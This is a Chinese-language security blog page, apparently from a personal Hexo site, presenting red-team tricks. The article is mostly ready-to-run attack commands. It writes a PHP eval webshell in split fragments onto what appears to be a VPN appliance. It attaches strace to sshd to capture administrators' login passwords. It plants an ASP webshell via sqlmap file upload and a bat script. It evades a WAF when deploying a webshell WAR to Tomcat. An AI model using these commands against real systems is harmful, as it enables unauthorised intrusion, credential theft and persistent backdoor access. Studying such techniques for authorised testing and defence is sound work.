@@ -1,0 +1,424 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>红队视角下的奇技淫巧 | Jici&#39;s Blog</title>
+  <meta name="author" content="Jici">
+  
+  <meta name="description" content="高限制下的木马写入高限制场景包括：服务器不出网（不能进行远程下载）、写木马有限制、命令长度有限制等
+这时候采取的策略是，将木马分割成一段一段，逐段写入，最后合并文件为完整的木马文件，这同样适用于Webshell的写入。这里举一个分段写入Webshell的例子：">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="红队视角下的奇技淫巧"/>
+  <meta property="og:site_name" content="Jici&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon-16x16.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<!-- hexo injector head_end start --><script> let HEXO_MMEDIA_DATA = { js: [], css: [], aplayerData: [], metingData: [], artPlayerData: [], dplayerData: []}; </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Jici&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>所有文章
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>关于我
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/record" title="Record all kinds of completed target machines">
+			  <i class=""></i>记录榜
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/plan" title="Record what needs to be done and what is worth doing">
+			  <i class=""></i>计划清单
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/friendlinks" title="my friends">
+			  <i class=""></i>友情链接
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/pictureGallery" title="Record some exquisite pictures">
+			  <i class=""></i>画廊
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@2.7.8/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+	
+		<div class="page-header">
+			<h1> 红队视角下的奇技淫巧</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="高限制下的木马写入"><a href="#高限制下的木马写入" class="headerlink" title="高限制下的木马写入"></a>高限制下的木马写入</h1><p>高限制场景包括：服务器不出网（不能进行远程下载）、写木马有限制、命令长度有限制等</p>
+<p>这时候采取的策略是，将木马分割成一段一段，逐段写入，最后合并文件为完整的木马文件，这同样适用于Webshell的写入。这里举一个分段写入Webshell的例子：</p>
+<pre class="line-numbers language-none"><code class="language-none">echo -e -n \&quot;&lt;?php \&quot; &gt; &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;1.txt
+
+echo -e -n \&quot;eval\&quot; &gt; &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;2.txt
+
+echo -e -n &#39;($_POST[\&quot;poo&#39; &gt; &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;3.txt
+
+echo -e -n &#39;\&quot;])&#39; &gt; &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;4.txt
+
+echo -e -n \&quot; ?&gt;\&quot; &gt; &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;5.txt
+
+cat &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;1.txt &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;2.txt &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;3.txt &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;4.txt &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;5.txt&gt; &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2024/03/27/%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20240327191241089.png" alt="image-20240327191241089"></p>
+<p>这里再推荐一个由这种思路产生的工具<a target="_blank" rel="noopener" href="https://github.com/corunb/Split_tools">Split_tools</a></p>
+<p><img src="/2024/03/27/%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20230307093032359.png" alt="image-20230307093032359"></p>
+<h1 id="窃取Linux登录的账号密码"><a href="#窃取Linux登录的账号密码" class="headerlink" title="窃取Linux登录的账号密码"></a>窃取Linux登录的账号密码</h1><p>假设一个攻击场景：你的入口机器是一台Linux，并且发现所处C段大部分为Linux，此时也提权至root权限了，但因为是暴力提权上来的，你并不知道root的密码，尝试用MimiPenguin抓取密码无果，你需要获得root的密码，这有利于后续的横向（比如对同C段的其他IP机器进行撞库）。通过长期的蹲点，你发现业务管理员每周五下午会定时登录一次，有时早，有时晚（可能是人工巡检，也可能是脚本登录，但这都不重要），这时候可以&#x3D;&#x3D;使用strace命令监听管理员的密码&#x3D;&#x3D;</p>
+<pre class="line-numbers language-none"><code class="language-none">(strace -f -F -p &#96;ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;&#96; -t -e trace&#x3D;read,write -s 32 2&gt; &#x2F;tmp&#x2F;sshd.log &amp;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>一段时间后，对监听的日志进行过滤查看</p>
+<pre class="line-numbers language-none"><code class="language-none">grep -E &#39;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#39; &#x2F;tmp&#x2F;sshd.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>很幸运，你在这周五管理员上线的时候，捕获到了密码</p>
+<p><img src="/2024/03/27/%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20240327210605721.png" alt="image-20240327210605721"></p>
+<h1 id="不出网的sql注入-中文web目录写webshell"><a href="#不出网的sql注入-中文web目录写webshell" class="headerlink" title="不出网的sql注入+中文web目录写webshell"></a>不出网的sql注入+中文web目录写webshell</h1><p>假设场景：使用sqlmap扫描到当前站点存在sql注入，配合sqlmap的–os-shell参数获得了一个shell可以执行命令，但是你发现TCP&#x2F;UDP均不出网，由于sqlmap提供的shell不够方便，你决定写一个webshell便于配合哥斯拉、蚁剑进行后续渗透（同时也为了更方便连接），你定位到了web目录，但是web目录是中文目录（比如：D:\网站），你尝试写入，但是写入失败了。这时候&#x3D;&#x3D;可以先在本地写好一个bat脚本（内容是在web目录某位置写入webshell），再通过sqlmap上传写好的bat脚本，最后执行这个bat脚本把webshell写入web目录&#x3D;&#x3D;，具体如下</p>
+<pre class="line-numbers language-none"><code class="language-none"># 现在本地的shell.bat中写好写入webshell的代码，内容如下
+echo ^&lt;%%eval request(&quot;pass&quot;)%%^&gt; &gt;D:\网站\shell.asp
+
+# 通过sqlmap上传本地的shell.bat
+python3 sqlmap.py -r request_message.txt --batch --file-write shell.bat -file-dest c:\users\public\shell.bat
+
+#最后配合sqlmap的--os-shell参数获得的shell执行shell.bat，写入webshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在站点上访问一下webshell地址，确认webshell是否访问成功</p>
+<h1 id="Tomcat上传war包绕过WAF"><a href="#Tomcat上传war包绕过WAF" class="headerlink" title="Tomcat上传war包绕过WAF"></a>Tomcat上传war包绕过WAF</h1><p>攻击场景：成功登录了Tomcat 后台，你迅速地制作了一个包含webshell的WAR包进行部署，很遗憾，被WAF拦截了。这时候可以尝试利用<code>\\\</code>拆分war后缀，绕过waf（即&#x3D;&#x3D;将文件后缀修改为xxx.w\\ar&#x3D;&#x3D;）</p>
+<p><img src="/2024/03/27/%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20240327220634008.png" alt="image-20240327220634008"></p>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/03/25/判断文件是32位-64位/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-03-27 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/渗透测试/">渗透测试<span>20</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2024 Jici
+  
+      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>    
+</p>
+
+  <script src='https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+
+
+<span class="post-meta-divider">|</span>
+本站总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;次</span>
+
+<script>
+var bszCaller,bszTag;!function(){var c,d,e,a=!1,b=[];ready=function(c){return a||"interactive"===document.readyState||"complete"===document.readyState?c.call(document):b.push(function(){return c.call(this)}),this},d=function(){for(var a=0,c=b.length;c>a;a++)b[a].apply(document);b=[]},e=function(){a||(a=!0,d.call(window),document.removeEventListener?document.removeEventListener("DOMContentLoaded",e,!1):document.attachEvent&&(document.detachEvent("onreadystatechange",e),window==window.top&&(clearInterval(c),c=null)))},document.addEventListener?document.addEventListener("DOMContentLoaded",e,!1):document.attachEvent&&(document.attachEvent("onreadystatechange",function(){/loaded|complete/.test(document.readyState)&&e()}),window==window.top&&(c=setInterval(function(){try{a||document.documentElement.doScroll("left")}catch(b){return}e()},5)))}(),bszCaller={fetch:function(a,b){var c="BusuanziCallback_"+Math.floor(1099511627776*Math.random());window[c]=this.evalCall(b),a=a.replace("=BusuanziCallback","="+c),scriptTag=document.createElement("SCRIPT"),scriptTag.type="text/javascript",scriptTag.defer=!0,scriptTag.src=a,scriptTag.referrerPolicy="no-referrer-when-downgrade",document.getElementsByTagName("HEAD")[0].appendChild(scriptTag)},evalCall:function(a){return function(b){ready(function(){try{a(b),scriptTag.parentElement.removeChild(scriptTag)}catch(c){bszTag.hides()}})}}},bszCaller.fetch("//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback",function(a){bszTag.texts(a),bszTag.shows()}),bszTag={bszs:["site_pv","page_pv","site_uv"],texts:function(a){this.bszs.map(function(b){var c=document.getElementById("busuanzi_value_"+b);c&&(c.innerHTML=a[b])})},hides:function(){this.bszs.map(function(a){var b=document.getElementById("busuanzi_container_"+a);b&&(b.style.display="none")})},shows:function(){this.bszs.map(function(a){var b=document.getElementById("busuanzi_container_"+a);b&&(b.style.display="inline")})}};
+</script>
+
+
+<!-- <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("08/12/2023 00:00:00");//在此处修改你的建站时间
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已勉强运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+    setInterval("createtime()",250);
+</script>
+<br><br>
+<span class="num">及辞已经在本站记录了 119.3k 字</span>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    fetch('/imageCount.json')
+      .then(response => response.json())
+      .then(data => {
+        const imageCount = data.count;
+        const imageCountElement = document.getElementById('imageCount');
+        imageCountElement.textContent = `共计收录了 ${imageCount} 张图片`;
+      })
+      .catch(error => {
+        console.error('Failed to load image count:', error);
+      });
+  });
+</script>
+<br><br>
+<span id="imageCount">正在加载图片数目...</span>
+</div> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!-- hexo injector body_end start --><script src="/assets/mmedia/mmedia-loader.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/ni-j.model.json"},"display":{"position":"left","width":260,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+   </html>
+
+<!-- 雪花特效 -->
+<!-- 直接引用公网CDN在线文件 -->
+<!-- <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/xuehuapiaoluo.js">-->
+<!-- 引用本地文件 -->
+<!--<script type="text/javascript" src="\js\snow.js"></script>-->
+
+<!-- 樱花花特效 -->
+<!-- 直接引用公网CDN在线文件 -->
+<!--<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>-->
+<!-- 引用本地文件 -->
+<script type="text/javascript" src="\js\sakura.js"></script>
+
+
+<!-- 数字雨 
+<canvas id="canvas" width="1440" height="900" ></canvas>
+<script type="text/javascript" src="/js/DigitalRain.js"></script>-->
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+
+<!--图片预加载-->
+<script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
